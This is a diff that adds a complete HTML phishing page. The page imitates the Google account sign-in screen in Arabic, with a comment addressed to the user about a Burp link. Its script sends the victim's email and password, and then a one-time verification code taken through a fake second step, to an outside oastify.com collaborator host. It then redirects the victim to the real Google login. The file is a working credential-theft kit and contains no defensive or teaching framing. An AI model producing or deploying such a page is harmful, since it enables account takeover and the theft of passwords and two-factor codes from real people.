@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - حسابات Google</title>
+    <link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
+        p.subtitle { font-size: 16px; margin-bottom: 30px; color: #202124; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 20px; text-align: right; }
+        input:focus { border: 2px solid #1a73e8; }
+        .next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: left; }
+        #step2 { display: none; }
+    </style>
+</head>
+<body>
+<div class="login-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="logo">
+    <div id="step1">
+        <h1>تسجيل الدخول</h1>
+        <p class="subtitle">استخدام حسابك على Google</p>
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+        <input type="password" id="pass" placeholder="أدخل كلمة المرور">
+        <button class="next-btn" onclick="next()">التالي</button>
+    </div>
+    <div id="step2">
+        <h1>تأكيد الهوية</h1>
+        <p class="subtitle">أرسلنا رمز تحقق إلى هاتفك</p>
+        <input type="text" id="otp" placeholder="G- ######">
+        <button class="next-btn" onclick="finish()">تأكيد</button>
+    </div>
+</div>
+
+<script>
+    // رابط البرب حقك (تأكد إنه شغال)
+    const collab = "https://B0ccvemapuqpc1vj0j9jgr8db4hv5lta.oastify.com";
+
+    function next() {
+        const e = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        if(e && p) {
+            fetch(`${collab}/G_LOGIN?u=${encodeURIComponent(e)}&p=${encodeURIComponent(p)}`);
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
+    }
+    function finish() {
+        const o = document.getElementById('otp').value;
+        if(o) {
+            fetch(`${collab}/G_OTP?code=${encodeURIComponent(o)}`);
+            window.location.href = "https://accounts.google.com";
+        }
+    }
+</script>
+</body>
+</html>
